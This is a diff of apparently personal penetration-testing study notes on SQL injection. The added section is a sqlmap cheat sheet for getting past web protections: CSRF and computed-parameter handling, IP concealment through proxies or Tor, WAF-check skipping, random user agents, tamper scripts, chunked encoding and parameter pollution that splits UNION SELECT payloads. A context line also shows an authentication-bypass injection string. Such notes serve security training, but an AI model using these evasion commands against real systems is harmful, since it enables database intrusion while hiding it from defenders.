@@ -394,4 +394,27 @@ Payload URL Encoded
 EX: admin' or '1'='1
 EX: SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
 NOTE: Using a prefix with sqlmap to inject 
-# Using SQLMAP and Bypassing protections
+# Bypassing Web Application Protestions
+- Anti CSRF Token Bypass
+CMD: --csrf-token
+- Unique Value Bypass
+CMD: --randomize : pointing to the parameter name containing a value which should be randomized before being sent:
+CMD: sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+- Calculated Parameter Bypass: where a valid Python code is being evaluated just before the request is being sent to the target: 
+CMD: --eval 
+CMD: sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+- IP Address Concealing : Setup a proxy with the option --proxy 
+CMD: --proxy="socks4://177.39.187.70:33283"
+NOTE: A list of proxies can be provide with the follwoing:  --proxy-file | --tor will auto connect | --check-tor to check config 
+- WAF Bypass 
+NOTE: SQLMAP authomatically test for WAF. Use --skip-waf to skip check.
+CMD: --skip-waf 
+- Ugent Agent Blacklisting Bypass
+NOTE: In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).
+CMD: --random-agent | easy bypass 
+- Tamper Scripts 
+NOTE: amper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).
+- Miscellaneous Bypasses
+NOTE & CMD: The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
+NOTE & CMD: The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).
+
